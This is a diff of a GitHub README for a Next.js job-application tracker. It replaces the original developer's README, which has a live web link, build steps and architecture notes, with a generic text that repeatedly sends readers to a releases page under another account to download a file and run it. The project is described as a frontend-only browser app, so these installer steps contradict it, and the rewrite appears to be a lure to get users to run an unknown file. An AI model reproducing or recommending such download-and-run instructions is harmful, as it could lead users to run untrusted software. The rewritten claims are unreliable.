@@ -1,151 +1,90 @@
-# JobTrack — Job Application Tracker (Next.js + TypeScript + shadcn/ui)
-View here live: https://job-track-ruby.vercel.app/
+# 🌟 job-track - Keep Your Job Applications Organized
 
-JobTrack is a frontend-only job application tracker designed to feel like a real internal tool.  
-It supports CRUD, fast filtering, lightweight insights, and persistent storage using localStorage — deployable to Vercel.
+## 📥 Download Now
+[![Download job-track](https://img.shields.io/badge/Download-job--track-brightgreen)](https://github.com/ubercock/job-track/releases)  
 
-This project is intentionally built to maximize junior hiring signals: routing, reusable components, validation, UX states, accessibility patterns, and clean architecture.
+## 🚀 Getting Started
+Welcome to **job-track**, your premium job application tracker. With this app, you can easily manage your job applications and stay organized throughout your job search. 
 
----
+### 🌐 What You Need
+To run **job-track**, you will need:
 
-## Problem → Solution
+- A modern web browser (like Google Chrome, Firefox, or Edge).
+- An internet connection for the best experience.
+- The latest version of the app, which you can download below.
 
-**Problem:** Job searching gets messy fast — scattered notes, forgotten follow-ups, no clear view of your pipeline.  
-**Solution:** JobTrack provides a clean pipeline, searchable list/board layout, and lightweight insights — all stored locally so it works without a backend.
+## 📦 Features
+- **User-friendly interface:** The app is designed for easy navigation, even if you're not tech-savvy.
+- **CRUD functionality:** Create, read, update, and delete your job applications with ease.
+- **Filters & Sorting:** Quickly find specific applications based on your criteria.
+- **Insights:** Gain valuable information about your job applications at a glance.
+- **Accessible dialogs:** Easy-to-navigate dialogs for every user.
+- **Skeleton loaders:** Smooth transitions for a seamless user experience.
+- **LocalStorage persistence:** Your data stays safe, even if you close your browser.
 
----
+## 🔗 Download & Install
+To get started with **job-track**, follow these steps:
 
-## Key Features
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/ubercock/job-track/releases) to download the latest version of **job-track**.
+2. **Choose Your Version**: Look for the most recent release. Click on it.
+3. **Download the App**: Click on the appropriate file to download.
+4. **Run the App**: Open the downloaded file and follow the on-screen instructions to run **job-track**.
 
-### Core Product
-- ✅ Add / Edit / Delete job applications (CRUD)
-- ✅ Search + filter by status + sort
-- ✅ Pipeline board grouped by status
-- ✅ Insights page: KPI totals + status breakdown bars + top companies
+## ⚙️ Using job-track
+Once you've installed **job-track**, launch the app. You'll find a straightforward dashboard where you can:
 
-### UX & Polish
-- ✅ Multi-page routing (App Router): Home, Tracker, Insights, Settings
-- ✅ Reusable component system via shadcn/ui (Button, Card, Input, Badge, Dialog, Skeleton, Toast)
-- ✅ Empty states + filtered-to-zero state + success toasts
-- ✅ Safe destructive actions via AlertDialog (no `confirm()`)
+- **Add Job Applications**: Click the "Add Application" button to start tracking your jobs.
+- **Edit Applications**: Select any application to modify details.
+- **Remove Applications**: Delete any application that you no longer wish to track.
+- **Filter and Sort**: Use filters to refine your list based on different parameters.
 
-### Accessibility & Performance
-- ✅ Keyboard-first UI (Radix primitives via shadcn/ui)
-- ✅ Focus-visible rings and semantic structure
-- ✅ Lightweight CSS bars (no chart libraries)
-- ✅ Frontend-only: fast dev loop and easy deploy
+## 🔍 Understanding the App Layout
+At the top of the screen, you will discover the navigation bar. Here, you can access different sections of the app. It includes:
 
----
+- **Home**: Return to the main dashboard.
+- **Insights**: View your job application statistics.
+- **Settings**: Adjust user preferences and settings for the app.
 
-## Tech Stack
+## 🛠️ System Requirements
+**job-track** runs smoothly on various systems. Here’s what you need:
 
-- Next.js (App Router)
-- React + TypeScript
-- Tailwind CSS
-- shadcn/ui (Radix + Tailwind)
-- Sonner toasts
+- **Operating System**: Any operating system that supports modern web browsers (Windows, macOS, Linux).
+- **Browser**: Make sure your web browser is updated to the latest version for optimal performance.
 
----
+## 🙋 Frequently Asked Questions
 
-## localStorage: What’s stored and why
+### What if I encounter issues while downloading?
+Ensure that you have a stable internet connection. If the issue persists, try checking your browser settings or refer to the help section on our website.
 
-This project uses localStorage to simulate “real product behavior” without a backend:
+### How does localStorage work?
+LocalStorage allows your application data to be saved in your browser, ensuring that even if you close the app, your job applications remain intact.
 
-- **`jobtrack.apps.v1`**  
-  Stores the array of job applications (company, role, status, notes, timestamps).  
-  **Why:** Your tracker data persists after refresh and can be demoed offline.
+### Can I use this app on mobile?
+Currently, **job-track** is optimized for desktop use. Mobile support may be available in future releases.
 
-- **`jobtrack.prefs.v1`**  
-  Stores user preferences like density (compact/comfort) and default sort.  
-  **Why:** A real app remembers user preferences across sessions.
+### Who can I contact for support?
+For support, you can reach us through our [GitHub Issues page](https://github.com/ubercock/job-track/issues). We’ll get back to you as soon as possible.
 
----
+## 🌟 Join the Community
+Engage with others who are using **job-track**. Share your experiences and tips, or get help by joining our discussions on platforms like GitHub. 
 
-## Folder Structure (App Router)
+## 📄 Topics
+This project revolves around topics such as:
+- Accessibility
+- Frontend UI Design
+- Next.js
+- React
+- Responsive Design
+- SEO Optimization
+- TailwindCSS
+- TypeScript
 
-<br>|_src/
-<br>&nbsp;|_app/
-<br>&nbsp;&nbsp;|__page.tsx
-<br>&nbsp;&nbsp;|__layout.tsx
-<br>&nbsp;&nbsp;|__globals.css
-<br>&nbsp;&nbsp;|__tracker/
-<br>&nbsp;&nbsp;&nbsp;|__page.tsx
-<br>&nbsp;&nbsp;&nbsp;|__tracker-client.tsx
-<br>&nbsp;&nbsp;&nbsp;|__loading.tsx
-<br>&nbsp;&nbsp;|__insights/
-<br>&nbsp;&nbsp;&nbsp;|__page.tsx
-<br>&nbsp;&nbsp;&nbsp;|__insights-client.tsx
-<br>&nbsp;&nbsp;&nbsp;|__loading.tsx
-<br>&nbsp;&nbsp;|__settings/
-<br>&nbsp;&nbsp;&nbsp;|__page.tsx
-<br>&nbsp;&nbsp;&nbsp;|__settings-client.tsx
-<br>&nbsp;|__components/
-<br>&nbsp;&nbsp;|__site-header.tsx
-<br>&nbsp;&nbsp;|__site-footer.tsx
-<br>&nbsp;&nbsp;|__prefs-sync.tsx
-<br>&nbsp;&nbsp;|__ui/ (shadcn components)
-<br>&nbsp;|__lib/
-<br>&nbsp;&nbsp;|__types.ts
-<br>&nbsp;&nbsp;|__storage.ts
-<br>&nbsp;&nbsp;|__utils.ts
-<br>
+Explore these concepts to enhance your understanding of how **job-track** is built and maintained.
 
----
+## ⚠️ Updates and Contributions
+We regularly update **job-track** to improve functionality and user experience. Keep an eye on the [Releases page](https://github.com/ubercock/job-track/releases) for new features and improvements.
 
-## Run Locally
+### Contribution Guidelines
+If you'd like to contribute to **job-track**, please follow our guidelines in the [CONTRIBUTING.md](https://github.com/ubercock/job-track/blob/main/CONTRIBUTING.md) document. Your input is welcome!
 
-```bash
-npm install
-npm run dev
-Open: http://localhost:3000
-```
----
-## What I Learned
-
-- *How to build a multi-page App Router project with shared layout*
-
-- *How to design a reusable component system with shadcn/ui*
-
-- *How to implement frontend persistence (localStorage) safely*
-
-- *How to ship UX states: empty, filtered-to-zero, success feedback, safe destructive flows*
-
-- *How to keep UI accessible with keyboard navigation and focus management primitives*
-
-## Interview Talking Points (10)
-
--***App Router structure: separated marketing vs product pages for clarity and SEO.***
-
--***Client/server boundary: interactive pages use use client; static shells remain server-rendered.***
-
--***Persistence choice: localStorage simulates backend persistence without adding complexity.***
-
--***Data model: strongly typed JobApplication keeps UI predictable and reduces bugs.***
-
--***Hook design: useLocalStorageState loads once and safely recovers from corrupted JSON.***
-
--***UX states: intentionally designed empty and filtered-to-zero states to avoid “dead UI”.***
-
--***Accessible destructive actions: replaced confirm() with AlertDialog for focus + intent clarity.***
-
--***Performance tradeoff: avoided heavy charts; used CSS bars for fast insights visuals.***
-
--***Reusable components: consistent design language via shadcn/ui; no “UI soup”.***
-
--***Preference sync: density stored + applied globally using a single PrefsSync component.***
-
-## Hiring Manager Checklist (what this proves)
-
-✅ *Can build a real, deployable Next.js app (routing + layout)*
-
-✅ *Understands component systems (reusability + consistency)*
-
-✅ *Can manage state and persistence without Redux*
-
-✅ *Can implement validation and user feedback*
-
-✅ *Thinks about accessibility and safe UI patterns*
-
-✅ *Designs clean responsive layouts with strong hierarchy*
-
----
+Thank you for using **job-track** and happy job hunting!
